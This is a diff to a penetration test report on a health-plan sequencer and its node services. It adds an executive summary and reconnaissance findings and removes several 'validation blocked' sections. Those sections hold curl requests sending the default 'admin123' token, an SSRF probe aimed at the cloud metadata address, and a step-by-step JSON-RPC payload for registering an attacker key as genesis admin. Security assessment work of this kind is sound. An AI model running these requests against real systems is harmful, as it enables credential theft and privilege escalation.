@@ -1,3 +1,51 @@
+# Security Assessment Report
+
+## Executive Summary
+
+**Target:** http://host.docker.internal:3030  
+**Assessment Date:** 2026-04-03  
+**Scope:** Authentication, Authorization, XSS, SQL and Command Injection, SSRF, and general application security testing
+
+### Summary by Vulnerability Type
+
+**Authentication Vulnerabilities:**
+Multiple critical authentication flaws discovered. The L2 RPC server's `checkAdminAuth()` function returns `true` unconditionally when no admin token is configured (ZKTRIDENT_ADMIN_TOKEN unset), allowing unauthenticated access to all 13 admin RPC methods. Additionally, 45+ interactive adjudication routes are completely unprotected, enabling unauthenticated state mutation. Hardcoded default credential "admin123" is exposed in served JavaScript. No rate limiting exists on authentication endpoints, enabling brute force attacks.
+
+**Authorization Vulnerabilities:**
+Extensive authorization bypass vulnerabilities across all application layers. The same admin auth bypass enables unauthorized access to visualization endpoints and formulary manipulation. Interactive routes lack all authorization checks, permitting unauthenticated access to sensitive operations including member enrollment, prescription creation, prior authorization approval, and system state reset. No ownership validation on wallet state queries exposes member and prescription data.
+
+**Cross-Site Scripting (XSS) Vulnerabilities:**
+One critical stored XSS vulnerability confirmed in the legacy dashboard gossip log. The `/viz/emit` endpoint accepts malicious payloads without sanitization and delivers them via SSE to all connected browsers. When the Gossip & Replication tab is active, `renderGossipLog()` writes data directly to `innerHTML` without encoding, executing arbitrary JavaScript in victim browsers with access to localStorage, cookies, and all API endpoints.
+
+**SQL/Command Injection Vulnerabilities:**
+No SQL or command injection vulnerabilities were found. The application uses no traditional SQL database (in-memory Merkle trees and JSON checkpoints only) and does not execute shell commands with user input.
+
+**Server-Side Request Forgery (SSRF) Vulnerabilities:**
+One critical SSRF vulnerability confirmed in member enrollment routes. The `insurerUrl` parameter is passed directly to server-side `fetch()` calls, allowing attackers to force the server to make requests to internal services and forward the admin Bearer token. This enables credential theft from internal services like the Insurer node (port 4004) and other internal infrastructure.
+
+## Network Reconnaissance
+
+**Open Ports and Exposed Services:**
+- **Port 3030** - Leviathan Sequencer (L2 RPC server with JSON-RPC 2.0, REST, SSE, and interactive routes)
+- **Port 4001** - Member Nautilus Node (HTTP, onboarding phase: awaiting_token)
+- **Port 4002** - Prescriber Nautilus Node (HTTP, onboarding phase: ready)
+- **Port 4003** - Pharmacy Nautilus Node (HTTP, onboarding phase: ready)
+- **Port 4004** - Insurer Nautilus Node (HTTP, onboarding phase: ready)
+- **Port 4005** - Employer Nautilus Node (HTTP, onboarding phase: ready)
+- **Port 8000** - Explorer dashboard (static files + proxy to port 3030)
+
+**Security Configuration Issues:**
+- **No TLS/HTTPS on L2 Sequencer:** Port 3030 operates over plaintext HTTP with no Strict-Transport-Security headers
+- **Wildcard CORS:** All services configured with `Access-Control-Allow-Origin: *`, enabling cross-origin API exploitation from any website
+- **No CSP Headers:** Zero Content-Security-Policy headers detected; inline scripts and external resource loading unrestricted
+- **No Rate Limiting:** Authentication and enumeration endpoints accept unlimited requests (observed rates: 249-252 requests/second)
+- **No TLS on Internal Services:** Nautilus nodes (ports 4001-4005) use HTTP only; admin tokens transmitted in plaintext
+
+**Subdomain Enumeration:**
+No external subdomains discovered. Deployment is single-host via `host.docker.internal` with no DNS-resolvable external hostnames.
+
+---
+
 # Cross-Site Scripting (XSS) Exploitation Evidence
 
 ## Successfully Exploited Vulnerabilities
@@ -182,7 +230,6 @@ POST /viz/emit → HTTP 200: {"ok":true,"id":"viz-000026"}
 - **Screenshot:** `/repos/zpk_care/workspace/xss_screenshot.png`
 
 ---
-
 
 
 # Authentication Exploitation Evidence
@@ -508,40 +555,6 @@ curl -sv -X POST http://host.docker.internal:3030/rpc \
 
 ---
 
-## Potential Vulnerabilities (Validation Blocked)
-
-### AUTH-VULN-07: Timing Side-Channel on Nautilus Admin Token String Comparison
-
-**Summary:**
-- **Vulnerable location:** `src/nodes/nautilus-app-server.ts:301` — entity node admin auth
-- **Current Blocker:** Entity nodes (ports 4001-4005) in the current deployment have no admin token configured (`ZKTRIDENT_ADMIN_TOKEN` not set). The server returns HTTP 403 with "Admin routes require adminToken configuration" before the vulnerable comparison is ever reached, preventing exploitation.
-- **Potential Impact:** In any deployment where entity node admin tokens ARE configured, an attacker with network proximity could reconstruct the token character-by-character via timing measurements.
-- **Confidence:** HIGH
-
-**Evidence of Vulnerability:**
-
-Source code confirms non-constant-time comparison at `nautilus-app-server.ts:301`:
-```typescript
-// VULNERABLE (nautilus-app-server.ts:301)
-if (authHeader !== `Bearer ${this.config.adminToken}`) {
-  return this.sendResponse(res, 401, false, undefined, 'Unauthorized');
-}
-
-// SECURE (l2-rpc-server.ts:2419-2425) — correct implementation in same codebase:
-static safeEquals(a: string, b: string): boolean {
-  const bufA = Buffer.from(a);
-  const bufB = Buffer.from(b);
-  if (bufA.length !== bufB.length) return false;
-  return crypto.timingSafeEqual(bufA, bufB);
-}
-```
-
-Live testing confirms the short-circuit:
-```bash
-curl -s -X POST http://host.docker.internal:4005/tokens/generate \
-  -H "Authorization: Bearer admin123" \
-  -H "Content-Type: application/json" \
-  -d '{"groupId":"test","planId":"PLAN-GOLD-2026","validUntil":"20261231"}'
 # Response: {"error":"Admin routes require adminToken configuration"}
 # The vulnerable comparison at line 301 is never reached — adminToken is null
 ```
@@ -664,7 +677,6 @@ curl -s -X POST http://host.docker.internal:4001/onboarding/accept-token \
 
 Unauthorized enrollment of arbitrary wallets into health plans, giving them access to prescription benefits, prior authorization workflows, and claim adjudication — all without employer authorization.
 
-
 # SSRF Exploitation Evidence
 
 ## Successfully Exploited Vulnerabilities
@@ -764,36 +776,6 @@ This is definitive network boundary bypass — the attacker forced the server to
 
 ---
 
-## Potential Vulnerabilities (Validation Blocked)
-
-### SSRF-VULN-01: Prescriber Enrollment SSRF with Admin Token Credential Theft
-
-**Summary:**
-- **Vulnerable location:** `POST http://host.docker.internal:4002/onboarding/enroll` — `insurerUrl` parameter (`src/nodes/routes/prescriber-routes.ts:242`)
-- **Overview:** The prescriber node unconditionally appends the application admin Bearer token (`Authorization: Bearer <adminToken>`) to a server-side `fetch()` call directed at the attacker-supplied `insurerUrl`. Zero URL validation — no scheme check, no host allowlist, no CIDR block. Attacker receives the full admin token by hosting a listener at the SSRF destination.
-- **Current Blocker:** Prescriber node is in `ready` phase. The `/onboarding/enroll` handler enforces `server.getOnboardingPhase() === 'wallet_derived'`. No API endpoint exists to reset the node's phase from `ready` back to `wallet_derived`. Exhaustive bypass testing confirmed no reset path via HTTP.
-- **Potential Impact:** Full admin credential theft: attacker receives `Authorization: Bearer <adminToken>` header, granting control over all ~17 admin L2 RPC methods (formulary injection, forced batching, entity registration, plan manipulation, gossip relay). Hardcoded fallback `admin123` further widens exposure on unsecured deployments.
-- **Confidence:** HIGH
-
-**Evidence of Vulnerability:**
-
-Static analysis of `src/nodes/routes/prescriber-routes.ts:239-249`:
-```typescript
-const enrollHeaders: Record<string, string> = { 'Content-Type': 'application/json' }
-const adminToken = server.getConfig().adminToken
-if (adminToken) enrollHeaders['Authorization'] = `Bearer ${adminToken}`  // ← forwarded unconditionally
-await fetch(`${b.insurerUrl}/enrollment/process`, {   // ← zero URL validation
-  method: 'POST',
-  headers: enrollHeaders,
-  body: JSON.stringify({ walletId, tokenId, role: 'prescriber' })
-})
-```
-
-Live confirmation of phase gate:
-```bash
-curl -s -X POST http://host.docker.internal:4002/onboarding/enroll \
-  -H "Content-Type: application/json" \
-  -d '{"insurerUrl": "http://169.254.169.254"}'
 # Response: {"ok":false,"timestamp":...,"error":"Cannot enroll in phase: ready"}
 ```
 
@@ -940,7 +922,6 @@ If the pharmacy node is in `wallet_derived` phase:
 
 **Expected Impact:**
 Same as SSRF-VULN-01 — full L2 admin credential theft and sequencer compromise.
-
 
 # Authorization Exploitation Evidence
 
@@ -1466,115 +1447,3 @@ HTTP 200 returned. The endpoint executed with zero authentication. No authorizat
 **Proof of Impact:** `GET /node/receipts-by-wallet` returns HTTP 200 `{"receipts":[]}` for all tested wallets without authentication. `GET /node/claim-proof?leafIndex=0` returns HTTP 200 with no authentication required. Both endpoints have a complete absence of authorization controls confirmed.
 
 ---
-
-## Potential Vulnerabilities (Validation Blocked)
-
-### AUTHZ-VULN-14: Token Expiration Bypass via User-Supplied Date
-
-**Summary:**
-- **Vulnerable location:** `POST http://host.docker.internal:4005/tokens/{tokenId}/validate`
-- **Current Blocker:** No tokens exist in the employer's token authority database to validate. Token generation (`POST /tokens/generate`) is protected by the Nautilus admin Bearer token (HTTP 403 returned), preventing creation of test tokens with known expiry dates.
-- **Potential Impact:** Validate any expired enrollment token as currently valid by supplying a far-future `currentDate` value in the request body. Enables enrollment with stale tokens that should no longer be accepted.
-- **Confidence:** MEDIUM
-
-**Evidence of Vulnerability:**
-
-Source code confirms the vulnerability at `employer-routes.ts:234-235`:
-```typescript
-const date = b?.currentDate ?? new Date()...
-```
-And at `token-authority.ts:141-146`:
-```typescript
-const current = BigInt(currentDate)  // caller-supplied, no server-side validation
-// compared to BigInt(record.localData.validUntil)
-```
-The `currentDate` field is taken directly from the request body and used in the expiration comparison without any server-side clock validation.
-
-**Attempted Exploitation:**
-
-Attempts to find or create expired tokens for testing:
-- `POST /tokens/TOKEN-001/validate` with `{"currentDate":"20991231"}` → `{"valid":false,"reason":"Token not found"}`
-- `POST /tokens/TOKEN-008/validate` with `{"currentDate":"20991231"}` → `{"valid":false,"reason":"Token not found"}`
-- `GET /tokens` → HTTP 404
-- `POST /tokens/generate` → HTTP 403 (admin token required)
-- All token IDs visible in visualization history (`TOKEN-001` through `TOKEN-008`) are visualization-layer labels, not actual token authority records.
-
-**How This Would Be Exploited:**
-
-If an expired token ID were available:
-
-1. Obtain or observe an expired enrollment token ID (e.g., `token-uuid-here`)
-2. Validate it with a far-future date:
-   ```
-   POST http://host.docker.internal:4005/tokens/token-uuid-here/validate
-   Content-Type: application/json
-
-   {"currentDate": "20991231"}
-   ```
-3. Response would return `{"valid": true}` despite the token being expired
-4. Use the "validated" token in subsequent enrollment workflow
-
-**Expected Impact:** Expired employer enrollment tokens could be reused indefinitely, enabling enrollment of employees who should no longer qualify under a lapsed token grant.
-
----
-
-### AUTHZ-VULN-15: Admin Key Genesis Registration — Potential Privilege Escalation
-
-**Summary:**
-- **Vulnerable location:** `POST http://host.docker.internal:3030/rpc` — `l2_registerAdminKey`
-- **Current Blocker:** All registration attempts return `-32603 Internal error`. Source code analysis confirms the registration fails inside the method handler (not at the auth dispatch layer — the auth bypass from VULN-01 does allow the call to reach the handler). The server-side check at `l2-rpc-server.ts:774` — `if (!genesisKey && !this.options.unsecureMode)` — blocks registration in the current deployment.
-- **Potential Impact:** Register an attacker-controlled Ed25519 public key as the genesis admin — permanently escalating to `admin:L2` with cryptographic signing authority over all future admin operations, including approving new admin keys and locking out legitimate operators.
-- **Confidence:** LOW
-
-**Evidence of Vulnerability:**
-
-Source code confirms the bypass path at `l2-rpc-server.ts:772-787`:
-```typescript
-if (this.adminKeyRegistry.size === 0) {
-  const genesisKey = process.env.ZKTRIDENT_GENESIS_ADMIN_KEY;
-  if (!genesisKey && !this.options.unsecureMode) {
-    throw new Error('...');   // blocks if secure mode and no genesis key set
-  }
-  if (genesisKey && publicKeyHex !== genesisKey) {
-    throw new Error('...');   // blocks if key doesn't match genesis key
-  }
-  this.adminKeyRegistry.set(nodeId, {...});   // REGISTERS without auth check
-  return { registered: true, nodeId, genesis: true };
-}
-```
-`l2_getAdminKeys` returns `[]` (empty registry confirmed). The auth dispatch bypass (VULN-01) allows `l2_registerAdminKey` to be called unauthenticated. The blocking occurs inside the method, not at authentication.
-
-**Attempted Exploitation:**
-
-Multiple registration attempts with valid 64-character hex Ed25519 public keys:
-- `publicKeyHex: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"` → `-32603 Internal error`
-- `publicKeyHex: "0102030405060708091011121314151617181920212223242526272829303132"` → `-32603 Internal error`
-- `publicKeyHex: "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef"` → `-32603 Internal error`
-
-The `-32603` error indicates the server-side check at line 774 or 777 throws before registration completes.
-
-**How This Would Be Exploited:**
-
-If the server were configured with `unsecureMode: true` and no `ZKTRIDENT_GENESIS_ADMIN_KEY` environment variable:
-
-1. Generate an Ed25519 keypair and obtain the 64-hex public key
-2. Register as genesis admin:
-   ```
-   POST http://host.docker.internal:3030/rpc
-   Content-Type: application/json
-
-   {
-     "jsonrpc": "2.0",
-     "method": "l2_registerAdminKey",
-     "params": {
-       "nodeId": "attacker-node",
-       "publicKeyHex": "[ATTACKER_ED25519_PUBKEY_64HEX]",
-       "reason": "genesis-registration"
-     },
-     "id": 1
-   }
-   ```
-3. Response: `{"result":{"registered":true,"nodeId":"attacker-node","genesis":true}}`
-4. Use attacker's private key to sign all subsequent admin operations with permanent cryptographic authority
-
-**Expected Impact:** Permanent `admin:L2` privilege escalation. After genesis registration, the attacker controls the admin key registry — they can approve additional keys, revoke legitimate operator keys, and maintain persistent access even if the auth bypass (VULN-01) is patched.
